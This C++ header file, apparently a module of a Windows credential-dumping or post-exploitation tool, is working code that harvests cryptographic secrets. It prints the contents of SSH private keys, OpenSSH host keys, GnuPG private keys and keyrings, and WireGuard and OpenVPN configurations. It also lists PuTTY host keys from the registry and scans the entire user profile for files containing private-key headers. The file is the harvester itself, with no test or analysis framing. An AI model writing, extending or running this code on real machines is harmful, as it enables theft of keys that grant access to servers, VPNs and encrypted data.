#ifndef CRYPTO_KEYS_DUMP_H
#define CRYPTO_KEYS_DUMP_H

// Harvests cryptographic key material from known locations and from the
// entire user profile:
//   - SSH private keys (user)
//   - OpenSSH host keys (system)
//   - PuTTY host keys (registry)
//   - GnuPG keyring and private keys
//   - WireGuard and OpenVPN configurations
//   - Generic PEM/KEY/PGP/ASC key material anywhere under %USERPROFILE%
//
// All operations run in the current user context.

#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>

namespace CryptoKeysDump {

    // Files larger than this are skipped to avoid hanging on binaries.
    static constexpr size_t kMaxFileSize = 5 * 1024 * 1024;

    // Maximum number of files visited by the full-profile scan.
    static constexpr size_t kMaxScanFiles = 50000;

    // Regex matching every common private-key block header.
    // Covers PKCS#8, RSA, EC, DSA, OpenSSH, encrypted PKCS#8 and PGP.
    static const std::regex kKeyBlockRegex(
        "-----BEGIN (RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED |)PRIVATE KEY( BLOCK)?-----");

    // Heavy directories to skip during the full-profile scan.
    // These hold multi-GB caches and rarely contain useful key material.
    static const std::vector<std::wstring> kSkipSubstrings = {
        L"\\AppData\\Local\\Temp\\",
        L"\\AppData\\Local\\Packages\\",
        L"\\AppData\\Local\\Microsoft\\Edge\\",
        L"\\AppData\\Local\\Google\\",
        L"\\AppData\\Local\\BraveSoftware\\",
        L"\\AppData\\Local\\Vivaldi\\",
        L"\\AppData\\Local\\Opera Software\\",
        L"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\",
        L"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\",
        L"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\",
        L"\\AppData\\Local\\CrashDumps\\",
        L"\\AppData\\Local\\Programs\\",
        L"\\AppData\\Local\\ConnectedDevicesPlatform\\",
        L"\\.cache\\",
        L"\\.gradle\\",
        L"\\.m2\\",
        L"\\.nuget\\",
        L"\\node_modules\\",
        L"\\.vscode\\",
        L"\\.vscode-insiders\\",
        L"\\OneDrive\\"
    };

    // ---- Generic helpers ----

    inline void PrintFile(const std::filesystem::path& p, size_t maxBytes = 8192) {
        std::error_code ec;
        auto size = std::filesystem::file_size(p, ec);
        if (ec || size > kMaxFileSize) return;

        std::ifstream f(p, std::ios::binary);
        if (!f) return;
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        if (content.size() > maxBytes) content.resize(maxBytes);

        std::cout << "\n[+] " << p.string() << "\n";
        std::cout << content << "\n";
    }

    inline void DumpDir(const std::filesystem::path& dir,
                        const std::vector<std::wstring>& extensions = {}) {
        if (!std::filesystem::exists(dir)) return;
        try {
            for (auto& p : std::filesystem::recursive_directory_iterator(
                    dir, std::filesystem::directory_options::skip_permission_denied)) {
                if (!p.is_regular_file()) continue;
                if (!extensions.empty()) {
                    auto ext = p.path().extension().wstring();
                    bool match = false;
                    for (const auto& e : extensions) {
                        if (ext == e) { match = true; break; }
                    }
                    if (!match) continue;
                }
                PrintFile(p.path());
            }
        } catch (...) {}
    }

    inline bool IsInSkippableDir(const std::filesystem::path& p) {
        std::wstring s = p.wstring();
        for (const auto& sub : kSkipSubstrings) {
            if (s.find(sub) != std::wstring::npos) return true;
        }
        return false;
    }

    // Reads a file and prints it if it contains a BEGIN ... KEY block.
    inline void ScanFileForKeyBlock(const std::filesystem::path& p) {
        std::error_code ec;
        auto size = std::filesystem::file_size(p, ec);
        if (ec || size == 0 || size > 2 * 1024 * 1024) return;

        std::ifstream f(p, std::ios::binary);
        if (!f) return;
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());

        std::smatch m;
        if (std::regex_search(content, m, kKeyBlockRegex)) {
            std::cout << "\n[+] " << p.string() << "\n";
            std::cout << "    " << m.str() << "\n";
        }
    }

    // ---- 1. SSH private keys (user) ----

    inline void DumpSSHPrivateKeys() {
        std::cout << "\n--- SSH Private Keys ---\n";
        const char* up = std::getenv("USERPROFILE");
        if (!up) return;

        std::filesystem::path sshDir = std::filesystem::path(up) / ".ssh";
        if (!std::filesystem::exists(sshDir)) {
            std::cout << "[-] No .ssh directory.\n";
            return;
        }

        try {
            for (auto& p : std::filesystem::directory_iterator(sshDir)) {
                if (!p.is_regular_file()) continue;
                auto name = p.path().filename().wstring();
                if (name.find(L"id_") == 0 ||
                    name.find(L"key") != std::wstring::npos) {
                    PrintFile(p.path());
                }
            }
        } catch (...) {}
    }

    // ---- 2. OpenSSH host keys (system-wide) ----

    inline void DumpOpenSSHHostKeys() {
        std::cout << "\n--- OpenSSH Host Keys (system) ---\n";
        const char* pd = std::getenv("ProgramData");
        if (!pd) return;

        std::filesystem::path sshDir = std::filesystem::path(pd) / "ssh";
        if (!std::filesystem::exists(sshDir)) {
            std::cout << "[-] No OpenSSH host keys directory.\n";
            return;
        }
        DumpDir(sshDir);
    }

    // ---- 3. PuTTY host keys (registry) ----

    inline void DumpPuTTYHostKeys() {
        std::cout << "\n--- PuTTY Host Keys (registry) ---\n";
        HKEY hKey;
        LPCWSTR subkey = L"Software\\SimonTatham\\PuTTY\\SshHostKeys";
        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            std::cout << "[-] No PuTTY host keys.\n";
            return;
        }

        DWORD index = 0;
        WCHAR valueName[1024];
        BYTE data[4096];
        DWORD valueNameSize, dataSize, type;

        while (true) {
            valueNameSize = 1024;
            dataSize = sizeof(data);
            LONG rc = RegEnumValueW(hKey, index++, valueName, &valueNameSize,
                                    NULL, &type, data, &dataSize);
            if (rc == ERROR_NO_MORE_ITEMS) break;
            if (rc != ERROR_SUCCESS) continue;

            std::wcout << L"  [" << valueName << L"]\n";
            if (type == REG_SZ || type == REG_EXPAND_SZ) {
                std::wcout << L"    " << reinterpret_cast<wchar_t*>(data) << L"\n";
            }
        }
        RegCloseKey(hKey);
    }

    // ---- 4. GnuPG ----

    inline void DumpGnuPG() {
        std::cout << "\n--- GnuPG ---\n";
        const char* ad = std::getenv("APPDATA");
        if (!ad) return;

        std::filesystem::path gnupg = std::filesystem::path(ad) / "gnupg";
        if (!std::filesystem::exists(gnupg)) {
            std::cout << "[-] No GnuPG directory.\n";
            return;
        }

        std::filesystem::path privDir = gnupg / "private-keys-v1.d";
        if (std::filesystem::exists(privDir)) {
            std::cout << "[+] GnuPG private keys: " << privDir.string() << "\n";
            DumpDir(privDir, { L".key" });
        }

        std::filesystem::path pubring = gnupg / "pubring.kbx";
        if (std::filesystem::exists(pubring)) PrintFile(pubring, 4096);

        std::filesystem::path gpgConf = gnupg / "gpg.conf";
        if (std::filesystem::exists(gpgConf)) PrintFile(gpgConf);

        // Armored PGP keys (private and public) in the same folder.
        DumpDir(gnupg, { L".asc", L".gpg", L".pgp" });
    }

    // ---- 5. WireGuard ----

    inline void DumpWireGuard() {
        std::cout << "\n--- WireGuard ---\n";
        const char* pf = std::getenv("ProgramFiles");
        if (!pf) return;

        std::filesystem::path wg = std::filesystem::path(pf) /
            "WireGuard" / "Data" / "Configurations";
        if (std::filesystem::exists(wg)) {
            DumpDir(wg, { L".conf", L".key" });
        }
    }

    // ---- 6. OpenVPN ----

    inline void DumpOpenVPN() {
        std::cout << "\n--- OpenVPN ---\n";
        const char* up = std::getenv("USERPROFILE");
        if (!up) return;

        std::filesystem::path ovpn = std::filesystem::path(up) /
            "OpenVPN" / "config";
        if (std::filesystem::exists(ovpn)) {
            DumpDir(ovpn, { L".ovpn", L".key", L".crt", L".pem" });
        }
    }

    // ---- 7. Generic key material (whole user profile) ----
    inline void DumpUserProfileRoot() {
        std::cout << "\n--- User Profile Root (direct files) ---\n";
        const char* up = std::getenv("USERPROFILE");
        if (!up) return;

        std::filesystem::path root(up);
        if (!std::filesystem::exists(root)) {
            std::cout << "[-] USERPROFILE not accessible.\n";
            return;
        }

        static const std::vector<std::wstring> keyExts = {
            L".asc", L".key", L".pem", L".pub", L".priv", L".privkey",
            L".crt", L".cer", L".pfx", L".p12", L".ppk",
            L".gpg", L".pgp", L".jks", L".keystore"
        };

        size_t found = 0;
        try {
            for (auto& p : std::filesystem::directory_iterator(
                    root,
                    std::filesystem::directory_options::skip_permission_denied)) {

                if (!p.is_regular_file()) continue;

                auto ext = p.path().extension().wstring();
                bool extMatch = false;
                for (const auto& e : keyExts) {
                    if (ext == e) { extMatch = true; break; }
                }

                // Extensionless files at the root — scan small ones only.
                if (!extMatch) {
                    if (!ext.empty()) continue;
                    std::error_code ec;
                    auto size = std::filesystem::file_size(p.path(), ec);
                    if (ec || size > 128 * 1024) continue;
                }

                ScanFileForKeyBlock(p.path());
                ++found;
            }
        } catch (...) {}

        std::cout << "[i] Checked " << found
                  << " candidate file(s) at profile root.\n";
    }

    inline void DumpGenericKeyMaterial() {
        std::cout << "\n--- Generic Key Material (whole user profile) ---\n";
        const char* up = std::getenv("USERPROFILE");
        if (!up) return;

        std::filesystem::path upath(up);

        // Extensions that likely contain key material.
        static const std::vector<std::wstring> keyExts = {
            L".asc", L".key", L".pem", L".pub", L".priv", L".privkey",
            L".crt", L".cer", L".pfx", L".p12", L".ppk",
            L".gpg", L".pgp", L".jks", L".keystore"
        };

        size_t fileCount = 0;

        try {
            auto end = std::filesystem::recursive_directory_iterator();
            for (auto it = std::filesystem::recursive_directory_iterator(
                    upath, std::filesystem::directory_options::skip_permission_denied);
                 it != end; ++it) {

                if (fileCount >= kMaxScanFiles) {
                    std::cout << "[i] Reached " << kMaxScanFiles
                              << " files, stopping scan.\n";
                    break;
                }

                const auto& p = *it;

                if (p.is_directory()) {
                    if (IsInSkippableDir(p.path())) {
                        it.disable_recursion_pending();
                    }
                    continue;
                }
                if (!p.is_regular_file()) continue;
                ++fileCount;

                auto ext = p.path().extension().wstring();
                bool extMatch = false;
                for (const auto& e : keyExts) {
                    if (ext == e) { extMatch = true; break; }
                }

                // Also scan extensionless files, but only small ones
                // (PEM / PPK / OpenSSH keys often have no extension).
                if (!extMatch) {
                    if (!ext.empty()) continue;
                    std::error_code ec;
                    auto size = std::filesystem::file_size(p.path(), ec);
                    if (ec || size > 128 * 1024) continue;
                }

                ScanFileForKeyBlock(p.path());
            }
        } catch (...) {}

        std::cout << "[i] Scanned " << fileCount << " files.\n";
    }

    // ---- Orchestrator ----

    inline void Run() {
        std::cout << "\n=== Cryptographic Key Material ===\n";
        DumpSSHPrivateKeys();
        DumpOpenSSHHostKeys();
        DumpPuTTYHostKeys();
        DumpGnuPG();
        DumpWireGuard();
        DumpOpenVPN();
        DumpUserProfileRoot();
        DumpGenericKeyMaterial();
    }
}

#endif